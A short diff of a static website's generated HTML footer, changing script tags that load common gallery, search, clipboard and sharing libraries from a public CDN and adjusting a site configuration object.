-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
